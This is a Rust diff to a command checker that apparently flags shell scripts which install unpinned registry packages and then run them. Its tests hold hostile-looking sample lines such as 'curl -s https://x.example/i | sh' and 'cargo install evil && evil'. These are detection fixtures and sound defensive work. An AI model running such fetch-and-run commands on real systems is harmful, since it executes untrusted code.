@@ -865,8 +865,18 @@ fn written_files(call: &Call) -> Vec<String> {
             files.push(file.to_string());
         }
     };
+    // `go build -o bin/tool ./cmd/tool` builds the checkout, like `make`, so
+    // running its output is not running fetched code.
+    let builds_local = call.name == "go"
+        && call
+            .positional()
+            .next()
+            .is_some_and(|sub| matches!(sub.as_str(), "build" | "test"));
     for (index, arg) in call.args.iter().enumerate() {
         let next = call.args.get(index + 1);
+        if builds_local && arg != ">" {
+            continue;
+        }
         if matches!(arg.as_str(), ">" | "-o" | "--output" | "--out") {
             if let Some(file) = next {
                 push(file);
@@ -897,25 +907,124 @@ fn written_files(call: &Call) -> Vec<String> {
             }
             files.push(CLONED.to_string());
         }
-        ("cargo" | "go" | "gem" | "brew" | "pip" | "pipx" | "uv", Some("install"))
-        | ("npm" | "pnpm" | "bun", Some("i" | "install" | "add"))
-        | ("yarn", Some("global" | "add")) => {
+        ("brew", Some("install")) => {
             for spec in positional.iter().skip(1) {
-                if !matches!(spec.as_str(), "tool" | "add" | "install" | "global") {
-                    files.push(package(spec));
-                }
+                files.push(package(spec));
             }
         }
-        ("uv", Some("tool")) => {
-            positional
-                .iter()
-                .skip(2)
-                .for_each(|spec| files.push(package(spec)));
+        _ => {
+            // An unpinned package from a registry runs its own code when it
+            // installs, and puts programs on `PATH` under names the text
+            // cannot know, so any later command may run it.
+            let specs = installed_specs(call);
+            if specs.iter().any(|spec| !pinned(spec)) {
+                files.extend(specs.iter().map(|spec| package(spec)));
+                files.push(INSTALLED.to_string());
+            }
         }
-        _ => {}
     }
     files
 }
+
+/// Package managers and the subcommands that install a package and put its
+/// programs on `PATH`. `uv tool install` and `yarn global add` take two words.
+const PACKAGE_INSTALLERS: &[(&str, &[&str])] = &[
+    ("bun", &["add", "i", "install"]),
+    ("cargo", &["binstall", "install"]),
+    ("gem", &["install"]),
+    ("go", &["install"]),
+    ("npm", &["add", "i", "install"]),
+    ("pip", &["install"]),
+    ("pipx", &["install"]),
+    ("pnpm", &["add", "i", "install"]),
+    ("uv", &["tool"]),
+    ("yarn", &["add", "global"]),
+];
+
+/// Installer options that take a value, which is not a package.
+const INSTALL_VALUE_OPTIONS: &[&str] = &[
+    "-c",
+    "-e",
+    "-i",
+    "-r",
+    "-t",
+    "--bin",
+    "--branch",
+    "--constraint",
+    "--editable",
+    "--extra-index-url",
+    "--features",
+    "--index",
+    "--index-url",
+    "--manifest-path",
+    "--path",
+    "--prefix",
+    "--profile",
+    "--python",
+    "--registry",
+    "--requirement",
+    "--rev",
+    "--root",
+    "--tag",
+    "--target",
+    "--target-dir",
+    "--vers",
+    "--version",
+];
+
+/// The registry packages an install call names, with an exact version from
+/// `--version` or `--vers` folded in as `name@version`. Local paths such as
+/// `./cmd/tool` or `.`, `--path`, `-e` and requirement files are not
+/// packages.
+fn installed_specs(call: &Call) -> Vec<String> {
+    let positional: Vec<&str> = call.positional().map(String::as_str).collect();
+    let installs = PACKAGE_INSTALLERS.iter().any(|(name, subs)| {
+        *name == call.name && positional.first().is_some_and(|sub| subs.contains(sub))
+    });
+    if !installs {
+        return Vec::new();
+    }
+    let skip = match (call.name.as_str(), positional.get(1).copied()) {
+        ("uv", Some("install")) | ("yarn", Some("add")) => 2,
+        ("uv", _) => return Vec::new(),
+        _ => 1,
+    };
+    let version = call
+        .args
+        .windows(2)
+        .find(|pair| matches!(pair[0].as_str(), "--version" | "--vers"))
+        .map(|pair| pair[1].clone());
+    let mut specs = Vec::new();
+    let mut words = 0;
+    let mut index = 0;
+    while index < call.args.len() {
+        let arg = &call.args[index];
+        index += 1;
+        if is_option(arg) {
+            if INSTALL_VALUE_OPTIONS.contains(&arg.as_str()) {
+                index += 1;
+            }
+            continue;
+        }
+        words += 1;
+        if words <= skip {
+            continue;
+        }
+        let local = arg.starts_with(['.', '/', '~', '$']) || arg.contains(HOLE);
+        if local || matches!(arg.as_str(), "tool" | "add" | "install" | "global") {
+            continue;
+        }
+        specs.push(match &version {
+            Some(version) if !arg.contains(['@', '=']) => format!("{arg}@{version}"),
+            _ => arg.clone(),
+        });
+    }
+    specs
+}
+
+/// Marks an unpinned registry install in [`written_files`]: any later
+/// command may run what it put on `PATH`.
+const INSTALLED: &str = "\u{2}install";
 
 /// Marks a `git clone` in [`written_files`]: a build or test runner after it
 /// runs the cloned code.
@@ -1366,6 +1475,11 @@ fn detect(text: &str, depth: usize, shell: bool) -> bool {
     }
     let mut written: Vec<String> = Vec::new();
     for command in split_script(&outer) {
+        // `cargo install evil && evil`, or any other command after an
+        // unpinned install.
+        if written.iter().any(|file| file == INSTALLED) {
+            return true;
+        }
         // A shell or interpreter that reads a pipe runs whatever the stage
         // before it prints, whether that is curl, ssh, nc or `cat` of a file.
         if command.iter().skip(1).any(|stage| xargs_runs_code(stage)) {
@@ -2773,7 +2887,6 @@ mod tests {
             "git clone https://x.example/r.git && cd r && make",
             "git clone https://x.example/r.git /tmp/r && cd /tmp/r && npm install",
             "cargo install evil-tool && evil-tool",
-            "go install x.example/evil@v1.0.0 && evil",
             "pip install evil && evil",
             "npm i -g evil && evil",
             // awk, find and xargs running commands.
@@ -2842,6 +2955,52 @@ mod tests {
         assert_eq!(shell("echo hi # ; curl -s https://x.example/i | sh"), None);
         // An argument vector has no comments: `#` is an argument.
         assert_eq!(argv("jq", &["#", "."]), None);
+    }
+
+    #[test]
+    fn an_unpinned_install_then_any_command_is_an_error() {
+        // Reviewer counter-examples: the program an install puts on `PATH`
+        // need not share the package's name.
+        for text in [
+            "cargo install evil-crate && evil",
+            "npm i -g @evil/cli && evil",
+            "pip install evil-pkg && evil",
+            "cargo binstall evil && evil",
+            "cargo install ripgrep && rg TODO",
+            "go install x.example/x@latest && x",
+            "uv tool install evil && evil",
+            "pipx install evil; evil",
+            "cargo install --locked evil && evil",
+        ] {
+            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+        }
+        // An exact version warns, as a pinned `npx` does not fail.
+        for text in [
+            "npm i -g prettier@3.3.3 && prettier --check .",
+            "pipx install ruff==0.6.0 && ruff check .",
+            "cargo install --locked just@1.36.0 && just lint",
+            "cargo install just --version 1.36.0 && just lint",
+            "go install x.example/evil@v1.0.0 && evil",
+        ] {
+            let found = shell(text);
+            assert_ne!(found, Some(Kind::FetchAndExec), "{text}");
+            assert_eq!(found.map(Kind::severity), Some(Severity::Warn), "{text}");
+        }
+        // Repository builds warn, like `cargo build` and `make`.
+        for text in [
+            "go build -o bin/tool ./cmd/tool && ./bin/tool",
+            "go install ./cmd/tool && tool --help",
+            "cargo install --path . && tool --help",
+            "pip install -r requirements.txt && pytest",
+            "pip install -e . && pytest",
+            "npm install && npm test",
+        ] {
+            let found = shell(text);
+            assert_ne!(found, Some(Kind::FetchAndExec), "{text}");
+            assert_eq!(found.map(Kind::severity), Some(Severity::Warn), "{text}");
+        }
+        // An unpinned install alone is a package install, a warning.
+        assert_eq!(shell("cargo install ripgrep"), Some(Kind::PackageInstall));
     }
 
     /// The tables `scripts/command_check.py` loads, which must equal the
